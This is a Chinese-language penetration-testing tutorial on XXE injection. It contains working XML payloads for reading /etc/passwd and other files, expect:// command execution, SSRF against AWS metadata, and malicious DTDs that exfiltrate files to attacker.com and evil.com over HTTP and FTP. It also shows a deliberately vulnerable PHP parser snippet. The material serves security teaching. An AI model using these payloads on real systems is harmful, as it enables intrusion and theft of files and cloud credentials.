## XXE 攻击的类型

XXE 攻击有多种类型：

- [利用 XXE 检索文件]，即定义一个包含文件内容的外部实体，并在应用程序的响应中返回。
- [利用 XXE 执行 SSRF 攻击]，即基于后端系统的 URL 定义外部实体。

- [利用盲 XXE 带外泄露数据]，即敏感数据从应用程序服务器传输到攻击者控制的系统。
- [利用盲 XXE 通过错误消息检索数据]，即攻击者可以触发包含敏感数据的解析错误消息。

## 如何查找和测试 XXE 漏洞

手动测试 XXE 漏洞通常包括：

- 通过基于知名操作系统文件定义外部实体并在应用程序响应中返回的数据中使用该实体来测试[文件检索]

- 通过基于你控制的系统的 URL 定义外部实体并监控与该系统的交互来测试[盲 XXE 漏洞]。可用工具 [Burp Collaborator]。

- 通过使用 [XInclude 攻击]尝试检索知名操作系统文件，测试用户提供的非 XML 数据在服务器端 XML 文档中的易受攻击包含。

> **注意**
>
> 请记住，XML 只是一种数据传输格式。确保你还测试任何基于 XML 的功能是否存在其他漏洞，如 XSS 和 SQL 注入。你可能需要使用 XML 转义序列对载荷进行编码以避免破坏语法，但你也可以利用这一点来[混淆你的攻击]以绕过薄弱的防御。

## XXE 基础攻击

一旦确定端点可用于提交XML数据，你就可以开始测试XXE攻击所需功能的存在。这通常涉及发送一些试错XXE载荷并观察应用程序的响应。

如果应用程序从解析器返回结果，你可能能够执行经典XXE攻击——也就是说，你可以直接从服务器响应中读取泄露的文件。要搜索经典XXE，首先通过将XML实体插入XML输入并查看其是否正确加载来检查XML实体是否被解释：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test "Hello!">
]>
<example>&test;</example>
```

然后，通过尝试加载本地文件来测试`SYSTEM`关键字是否可用

### XXE 本地文件读取

要执行从服务器文件系统检索任意文件的 XXE 注入攻击，你需要以两种方式修改提交的 XML：

1. 引入（或编辑）一个 `DOCTYPE` 元素，定义一个包含文件路径的外部实体。
2. 编辑 XML 中在应用程序响应中返回的数据值，使其使用已定义的外部实体。

为了演示如何利用 XXE，考虑一个“书评”应用程序，允许用户通过 XML 输入导入/导出图书详细信息。XML 内容包括书名、作者、出版日期、ISBN 和评论。以下是包含所需值的无害 XML 输入示例。

**有效载荷**
```xml
<book>
    <bookName>The Great Gatsby</bookName>
    <author>F. Scott Fitzgerald</author>
</book>
```

提交此输入后，应用程序读取 XML 内容，解析它，并显示每个标签中包含的数据。

现在，让我们尝试声明一个实体 `xxe` 并将其指向 Web 服务器上的内部文件，例如著名的 `/etc/passwd`。

**有效载荷：**
```xml
<?xml version="1.0"?>
<!DOCTYPE book [
    <!ELEMENT book ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<book>
    <bookName>&xxe;</bookName>
    <author>F. Scott Fitzgerald</author>
</book>
```

使用 `&xxe;` 在 `<bookName>` 标签内引用该实体。一旦解析器遇到此引用，它会尝试从服务器文件系统加载 `/etc/passwd` 文件的内容，将其集成到 XML 文档中。现在让我们检查负责此漏洞的代码。

**易受攻击代码分析**
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['xml_content'])) {
    libxml_disable_entity_loader(false);
    $xml = $_POST['xml_content'];
    $doc = new DOMDocument();
    if ($doc->loadXML($xml, LIBXML_NOENT)) {
        $bookName = $doc->getElementsByTagName('bookName')->item(0)->textContent;
        // ...
        echo "<strong>Review:</strong><br><pre>" . $review . "</pre>";
    } else {
        echo "Error parsing XML.";
    }
}
```

显然，`libxml_disable_entity_loader(false);` 启用了外部实体的加载。`libxml_disable_entity_loader` 函数切换外部实体的加载。值得注意的是，`file` 架构并不是唯一可以被利用的；其他如 FTP、DNS 和 PHP 也可能被滥用。以下是 PHP 文档中一些内置包装器的列表，用于与多种文件系统函数（如 `fopen()`、`copy()` 等）一起使用。 <https://www.php.net/manual/en/wrappers.php>。

在某些环境中（服务器缺失索引页设置），仅引用 `/etc/` 目录（不指定文件）可能导致目录列表。

**示例**
```xml
<!ENTITY xxe SYSTEM "file:///etc/" >]>
```

根据应用程序解析 XML 的方式以及是否检查必需标签，可能可以使用最小有效载荷实现相同效果。

**有效载荷**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ELEMENT data ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<data>&xxe;</data>
```

对于 Windows 系统，像 `/etc/passwd` 这样的路径无效。相反，可以引用 `C:/Windows/System32/drivers/etc/hosts` 或 `C:/Windows/WindowsUpdate.log` 来确认 XXE。

**有效载荷**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ELEMENT data ANY >
    <!ENTITY xxe SYSTEM "file:///C:/Windows/WindowsUpdate.log" >
]>
<data>&xxe;</data>
```

#### 使用 PUBLIC 关键字替代 SYSTEM

当`SYSTEM`关键字不起作用时，你可以用`PUBLIC`关键字替换它。此标签要求你在`PUBLIC`关键字后提供带引号的ID。解析器使用它来为实体的值生成备用URL。出于我们的目的，你可以只使用一个随机字符串代替：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test PUBLIC "abc" "file:///etc/hostname">
]>
<example>&test;</example>
```

常见系统文件或路径可能受限

### 使用 XXE 进行远程代码执行

在 PHP 环境中，可能可以使用“expect 包装器”执行命令。需要注意的是，提供此功能的 `expect` PHP 扩展在许多 PHP 配置中默认未启用。然而，在渗透测试期间，发现已激活它的配置并不少见。

**有效载荷**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ELEMENT data ANY >
    <!ENTITY xxe SYSTEM "expect://id" >
]>
<data>&xxe;</data>
```

### 通过 php:// 读取本地文件 —— 特殊字符

如前所述，还有其他几种可用于检索本地文件的模式和包装器。其中之一是 `php://` 包装器。`php://` 包装器的一个显著优势是它能够处理带有特殊 XML 字符（如 `&`、`<` 和 `>`）的文件。如果处理不当，这些字符可能在解析过程中导致错误。

例如，配置文件可能包含以下行：
`<password>My&Password</password>`

由于存在 `&`，`My&Password` 可能会中断读取。但是，使用 `php://` 包装器，我们可以通过更改格式（如 base64）来避免此问题。这是一个有效载荷示例，它将检索 `/etc/passwd` 文件并将其转换为 base64。

**有效载荷**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>
```

## 发起 SSRF

除了检索敏感数据之外，XXE 攻击的另一个主要影响是它们可以用于执行服务器端请求伪造（SSRF）。这是一种潜在严重的漏洞，其中服务器端应用程序被诱导向服务器可访问的任何 URL 发起 HTTP 请求。

要利用 XXE 漏洞执行 SSRF 攻击，你需要使用你想要定位的 URL 定义一个外部 XML 实体，并在数据值中使用已定义的实体。

例如，通过切换外部实体URL中目标机器的不同端口来发起端口扫描。分析服务器响应的差异来确定端口状态：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "http://10.0.0.1:80">
]>
<example>&file;</example>
```

也可使用XXE发起SSRF以获取实例元数据。此载荷将使解析器返回 AWS 元数据：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<example>&file;</example>
```

在尝试查看此类非预期数据时，你应该通过检查页面源代码（右键点击页面并选择“查看源代码”）或直接检查HTTP响应来查找窃取的数据，而不是查看浏览器渲染的HTML页面，因为浏览器可能无法正确渲染页面。

当然，基于XXE的SSRF能做的不仅限于网络扫描和检索实例元数据。你也可以使用收集到的信息渗透到内部服务中。

详见 SSRF 小节

## 使用带外技术（OAST）进行盲 XXE 利用

当应用程序存在 XXE 注入漏洞，但其响应中不返回已定义外部实体的值时（不提供有效载荷的直接反馈），即产生盲 XXE 漏洞。

发现和利用盲 XXE 漏洞主要有两种方式：

- 触发到攻击者服务器的带外网络交互，有时可在交互数据中泄露敏感数据。
- 触发 XML 解析错误，使错误消息包含敏感数据。

为了绕过常见的防火墙限制，应首先测试80和443端口，因为目标防火墙可能不允许其他端口上的出站连接：

**标准实体载荷**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt">
]>
<example>&test;</example>
```

此 XXE 攻击会导致服务器向指定 URL 发起后端 HTTP 请求。攻击者监控由此产生的 DNS 查找和 HTTP 请求，从而检测 XXE 攻击是否成功。

应用程序通常会过滤和阻止**标准实体**。作为替代方案，尝试使用**参数实体**。

**参数实体载荷**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
    <!ENTITY % test SYSTEM "http://attacker_server:80/xxe_test.txt">
    %test;  
]>
```

### 通过 HTTP 的 OAST XXE

利用我们已涵盖的概念，让我们看看如何利用盲 XXE 检索本地文件。考虑一个场景，网站具易受 XXE 攻击，但不返回任何响应。

攻击者在他们控制的系统上托管恶意 DTD，然后在带内 XXE 载荷中调用外部 DTD。

用于泄露 `/etc/passwd` 文件内容的恶意 DTD 示例如下：

**evil.dtd**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com:80/?data=%file;'>">
%eval;
%exfiltrate;
```
此 DTD 执行以下步骤：

- 定义参数实体 `file`，获取 `/etc/passwd` 的内容
- 定义参数实体 `eval`，动态声明另一个名为 `exfiltrate` 的参数实体。
    - 当调用时，`exfiltrate` 实体向攻击者的服务器（`http://attacker.com:80`）发起 HTTP 请求。此请求将 `/etc/passwd` 内容作为 URL 的查询字符串。
- 引用 `eval` 实体，导致执行 `exfiltrate` 实体的动态声明。
- 引用 `exfiltrate` 实体，发起 HTTP 请求。

攻击者随后在他们控制的系统上托管此恶意 DTD，通常通过将其加载到自己的 Web 服务器上。例如，攻击者可能在以下 URL 提供恶意 DTD：

**attacker URL**
```
http://attacker.com/malicious.dtd
```

最后，攻击者向易受攻击的应用程序提交以下 XXE 载荷，以获取并解释托管在攻击者控制服务器上的外部 DTD（`evil.dtd`）：

**有效载荷**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
    <!ENTITY % remote SYSTEM "http://attacker.com:80/evil.dtd">
    %remote;
]>
```

此 XXE 载荷声明了一个名为 `remote` 的 XML 参数实体，然后在 DTD 中使用该实体。这将导致 XML 解析器从攻击者服务器获取外部 DTD 并内联解释。然后执行恶意 DTD 中定义的步骤，将 `/etc/passwd` 文件传输到攻击者服务器。

> **注意：** 此技术可能不适用于某些文件内容，包括 `/etc/passwd` 文件中包含的换行符。这是因为某些 XML 解析器使用验证 URL 中允许字符的 API 来获取外部实体定义中的 URL。在这种情况下，可能可以使用 FTP 协议代替 HTTP（或尝试 php 的 base64 编码组件，或 CDATA 标签）。有时，无法泄露包含换行符的数据，于是改为针对 `/etc/hostname` 等文件。

> 大多数解析器不允许外部实体包含在其他外部实体中，于是此处使用参数实体。
>
> `&#x25;`是百分号（`%`）的十六进制编码版本。根据目标的不同，动态声明中的特殊字符有时需要十六进制编码。
>
> 根据XML规范，参数实体在内联DTD（XML文档中`DOCTYPE`标签内指定的DTD）和外部DTD（托管在其他地方的单独DTD）中的处理方式不同。在内联DTD中，参数实体不能在标记中引用，而在外部DTD中，不存在此类限制。
>
> 于是要通过盲XXE窃取数据，必须通过在攻击者服务器上托管外部DTD来克服此限制。然后通过在一个参数实体中指定外部DTD并引用该实体来使目标解析器解释你的DTD

### 使用 FTP 的 XXE OAST —— 特殊字符

https://staaldraad.github.io/2016/12/11/xxeftp/

即使找到了 XXE 漏洞，数据泄露也可能没有内置到应用逻辑中。XXE 漏洞并不总是返回数据，即使 XXE 在服务器上正确执行也是如此。

在这种情况下，理想的做法是在解析期间而不是通过响应泄露数据。这称为**XML 带外数据泄露**。这最容易通过文件传输协议（FTP）完成，但在遗留服务器上也可以使用一种称为 Gopher 的较旧网络协议。

首先，在攻击者的服务器上确保载荷 DTD 文件 `data.dtd` 可通过 Web 访问，并包含以下内容：

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://evil.com/%d;'>">
```
- 定义实体 `%d`：引用本地文件
- 定义实体 `%c`：保存实体定义的字符串（之后被引用以动态构造新实体 `%rrr`）
  - 实体定义字符串中的实体 `%rrr`：使用 `ftp` 协议连接到攻击者主机（实体 `%d` 的内容作为路径）

之后，作为 XXE 载荷的一部分，包含对攻击者服务器的 DTD 文件的引用：

```xml
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY % dtd SYSTEM "https://evil.com/data.dtd">
  %dtd;
  %c;
]>
<a>&rrr;</a>
```
- 定义文档 `a`
- 定义外部实体引用，远程从攻击者服务器加载 dtd 文件
- 引用 dtd 文件中的参数实体 `%c`：动态构建 ftp 文件传输的实体定义 `%rrr`
- 在文档 `a` 中，引用普通实体 `&rrr;` 执行载荷
> 此处在 XXE 载荷内进行引用，另一种方式是在 DTD 文件内定义引用

目标服务器加载 XXE 载荷与载荷 DTD 文件后，将通过 FTP 逐行传输 `/etc/passwd` 文件的内容（FTP URL 路径中的换行符或被解析为独立的新 FTP 连接），将其结果留在攻击者的 log 中。在某些情况下，可以使用上述相同的技术通过 HTTP 或轻量级目录访问协议（LDAP）等其他协议流式传输数据。

### 利用盲 XXE 通过错误消息检索数据

利用盲 XXE 的另一种方法是尝试触发应用程序的 XML 解析错误，使服务器返回可能泄露敏感信息的错误消息。攻击者利用这些错误消息来推断系统的具体情况。

使用恶意外部 DTD 触发包含 `/etc/passwd` 文件内容的 XML 解析错误消息，如下所示：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

此 DTD 执行以下步骤：

- 定义名为 `file` 的 XML 参数实体，包含 `/etc/passwd` 文件的内容。
- 定义名为 `eval` 的 XML 参数实体，包含另一个名为 `error` 的 XML 参数实体的动态声明。`error` 实体将通过加载一个不存在的文件来求值，该文件的名称包含 `file` 实体的值。
- 使用 `eval` 实体，导致执行 `error` 实体的动态声明。
- 使用 `error` 实体，使其值通过尝试加载不存在的文件来求值，从而导致包含不存在文件名称的错误消息，该名称即为 `/etc/passwd` 文件的内容。

调用恶意外部 DTD 将产生如下错误消息：

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### 通过重新利用本地 DTD 利用盲 XXE

前述技术对外部 DTD 有效，但通常不适用于完全在 `DOCTYPE` 元素内指定的内部 DTD。这是因为该技术涉及在另一个参数实体的定义中使用 XML 参数实体。根据 XML 规范，这在外部 DTD 中是允许的，但在内部 DTD 中不允许。（某些解析器可能容忍，但许多不允许。）

那么，当带外交互被阻止时，盲 XXE 漏洞该怎么办？你无法通过带外连接泄露数据，也无法从远程服务器加载外部 DTD。

在这种情况下，由于 XML 语言规范中的漏洞，仍然可能触发包含敏感数据的错误消息。如果文档的 DTD 混合使用内部和外部 DTD 声明，则内部 DTD 可以重新定义在外部 DTD 中声明的实体。发生这种情况时，在另一个参数实体的定义中使用 XML 参数实体的限制会放宽。

这意味着攻击者可以在内部 DTD 中使用[基于错误的 XXE]技术，前提是他们使用的 XML 参数实体正在重新定义在外部 DTD 中声明的实体。当然，如果带外连接被阻止，则无法从远程位置加载外部 DTD。相反，它需要是应用程序服务器本地的外部 DTD 文件。本质上，攻击涉及调用恰好存在于本地文件系统上的 DTD 文件，并重新利用它来重新定义现有实体，从而触发包含敏感数据的解析错误。此技术由 Arseniy Sharoglazov 开创，并在 portswigger 的 [2018 年十大 Web 黑客技术](https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018#7) 中排名第 7。

例如，假设服务器文件系统上存在位于 `/usr/local/app/schema.dtd` 的 DTD 文件，并且此 DTD 文件定义了一个名为 `custom_entity` 的实体。攻击者可以通过提交如下混合 DTD 来触发包含 `/etc/passwd` 文件内容的 XML 解析错误消息：

```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```

此 DTD 执行以下步骤：

- 定义名为 `local_dtd` 的 XML 参数实体，包含服务器文件系统上存在的外部 DTD 文件的内容。
- 重新定义已在外部 DTD 文件中定义的名为 `custom_entity` 的 XML 参数实体。该实体被重新定义为包含之前描述过的[基于错误的 XXE 攻击]，用于触发包含 `/etc/passwd` 文件内容的错误消息。
- 使用 `local_dtd` 实体，以便解释外部 DTD，包括 `custom_entity` 实体的重新定义值。这会导致所需的错误消息。

#### 定位现有 DTD 文件以重新利用

由于此 XXE 攻击涉及重新利用服务器文件系统上的现有 DTD，因此关键要求是找到合适的文件。这实际上相当简单。由于应用程序返回 XML 解析器抛出的任何错误消息，你可以仅通过尝试从内部 DTD 加载本地 DTD 文件来轻松枚举它们。

例如，使用 GNOME 桌面环境的 Linux 系统通常在 `/usr/share/yelp/dtd/docbookx.dtd` 处有 DTD 文件。你可以通过提交以下 XXE 载荷来测试此文件是否存在，如果文件缺失将导致错误：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

在测试常见 DTD 文件列表以定位存在的文件后，你需要获取该文件的副本并检查它，找到可以重新定义的实体。由于包含 DTD 文件的许多常见系统都是开源的，你通常可以通过互联网搜索快速获取文件副本。

## CDATA 标签 —— 特殊字符

有时你会想要窃取包含XML特殊字符的文件，如尖括号（`<>`）、引号（`"`或`'`）和与符号（`&`）。通过XXE直接访问这些文件会破坏DTD的语法并干扰窃取。幸运的是，在XML文件中，包裹在`CDATA`（字符数据）标签内的字符不被视为特殊字符。因此，例如，如果你正在窃取一个XML文件，你可以将恶意外部DTD重写如下：

```xml
① <!ENTITY % file SYSTEM "file:///passwords.xml">
② <!ENTITY % start "<![CDATA[">
③ <!ENTITY % end "]]>">
④ <!ENTITY % ent "<!ENTITY &#x25; exfiltrate
'http://attacker_server/?%start;%file;%end;'>">
%ent;
%exfiltrate;
```

此DTD首先声明一个指向你要读取的文件的参数实体①。它还声明了两个包含字符串`"<![CDATA["`和`"]]>"`的参数实体②③。然后它通过将文件内容包裹在`CDATA`标签中构造一个不会破坏DTD语法的窃取URL④。连接后的`exfiltrate`实体声明将变为：

```
<!ENTITY % exfiltrate 'http://attacker_server/?<![CDATA[CONTENTS_OF_THE_FILE]]>'>
```

你可以看到我们的载荷正在迅速变得复杂。为防止意外将语法错误引入载荷，你可以使用XmlLint（https://xmllint.com/）等工具来确保XML语法有效。


## 找到你的第一个XXE

现在你已了解XXE攻击的基础知识，尝试在真实目标上找到你自己的XXE漏洞。按照本章介绍的步骤最大化成功的机会：

1. **找到可用于提交XML数据的数据入口点**。
2. **确定入口点是经典XXE还是盲XXE的候选**。如果端点在HTTP响应中返回解析后的XML数据，则可能容易受到经典XXE攻击。如果端点不返回结果，它可能仍然容易受到盲XXE攻击，你应该为测试设置回调监听器。
3. **尝试一些测试载荷**，查看解析器是否配置不当。在经典XXE的情况下，你可以检查解析器是否处理外部实体。在盲XXE的情况下，你可以让服务器向你的回调监听器发送请求，查看你能否触发外部交互。
4. **如果XML解析器具有使其容易受到XXE攻击的功能**，尝试窃取一个常见的系统文件，如`/etc/hostname`。
5. **你也可以尝试检索一些更敏感的系统文件**，如`/etc/shadow`或`~/.bash_history`。
6. **如果你无法使用简单的XXE载荷窃取整个文件**，尝试使用替代的数据窃取方法。
7. **看看你是否可以使用XXE发起SSRF攻击**。
